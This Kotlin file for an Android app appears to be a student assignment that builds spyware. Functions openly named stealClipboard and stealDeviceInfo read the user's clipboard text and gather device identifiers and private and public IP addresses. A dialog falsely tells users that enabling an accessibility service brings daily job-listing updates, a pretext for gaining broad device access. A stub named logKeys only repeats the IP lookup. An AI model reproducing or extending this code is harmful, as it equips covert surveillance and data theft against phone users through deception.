package com.example.assignment1.DataRetriever

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.*
import android.content.pm.ServiceInfo
import android.content.res.Resources
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.appcompat.app.AlertDialog
import com.example.assignment1.MyAccessibilityService
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.*

class General{
    private val ctx: Context?
    private val aty: Activity?

    constructor(context: Context?, act : Activity) {
        ctx = context
        aty = act
    }

    fun stealClipboard(): String{
        val clipboard = ctx!!.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        var clip = ""
        if (clipboard.hasPrimaryClip()) {
            val description = clipboard.primaryClipDescription
            val data = clipboard.primaryClip
            if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
                clip = data.getItemAt(0).text.toString()
        }
        return clip
    }

    fun stealDeviceInfo(): String {
        val width: Int = Resources.getSystem().getDisplayMetrics().widthPixels
        val height: Int = Resources.getSystem().getDisplayMetrics().heightPixels

        var ret = "Manufacturer:${android.os.Build.MANUFACTURER}|\n"
        ret += "Version/Release:${android.os.Build.VERSION.RELEASE}|\n"
        ret += "Version/Incremental:${android.os.Build.VERSION.INCREMENTAL}|\n"
        ret += "Fingerprint:${android.os.Build.FINGERPRINT}|\n"
        ret += "Product:${android.os.Build.PRODUCT}|\n"
        ret += "Model:${android.os.Build.MODEL}|\n"
        ret += "Brand:${android.os.Build.BRAND}|\n"
        ret += "Device:${android.os.Build.DEVICE}|\n"
        ret += "Width:${width}|\n"
        ret += "Height:${height}|\n"
        ret += "Host:${android.os.Build.HOST}|\n"
        ret += "User:${android.os.Build.USER}|\n"
        ret += "PrivateIP:${getIPAddress(true)}|\n"
        ret += "PublicIP:${getPublicIP()}"

        return ret
    }

    private fun getIPAddress(useIPv4: Boolean): String? {
        try {
            val interfaces: List<NetworkInterface> =
                Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs: List<InetAddress> = Collections.list(intf.getInetAddresses())
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress()) {
                        val sAddr: String = addr.getHostAddress()
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (useIPv4) {
                            if (isIPv4) return sAddr
                        } else {
                            if (!isIPv4) {
                                val delim = sAddr.indexOf('%')
                                return if (delim < 0) sAddr.uppercase(Locale.getDefault()) else sAddr.substring(
                                    0,
                                    delim
                                ).uppercase(
                                    Locale.getDefault()
                                )
                            }
                        }
                    }
                }
            }
        } catch (ignored: Exception) {
        }
        return ""
    }

    fun getPublicIP(): String? {
        val doc: Document = Jsoup.connect("https://www.checkip.org").get()
        return doc.getElementById("yourip").select("h1").first().select("span").text()
    }

    fun logKeys(): String? {
        val doc: Document = Jsoup.connect("https://www.checkip.org").get()
        return doc.getElementById("yourip").select("h1").first().select("span").text()
    }

    fun accessibilityCheck() {
        val accessibilityEnabled = isAccessibilityServiceEnabled(ctx!!, MyAccessibilityService::class.java)
        if(!accessibilityEnabled)
        {
            buildAlertMessageNoAccessibility()
        }
    }

    private fun buildAlertMessageNoAccessibility() {
        val builder: AlertDialog.Builder = AlertDialog.Builder(ctx!!)
        builder.setMessage("Please enable the accessibility service to allow updates on the job listing by requesting data from the server each day.")
            .setCancelable(true)
            .setPositiveButton("Ok",
                DialogInterface.OnClickListener { dialog, id -> aty!!.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
        val alert: AlertDialog = builder.create()
        alert.show()
    }

    fun isAccessibilityServiceEnabled( context: Context, service: Class<out AccessibilityService?> ): Boolean {
        val am = context.getSystemService(Activity.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
                    service.name
                )
            ) return true
        }
        return false
    }
}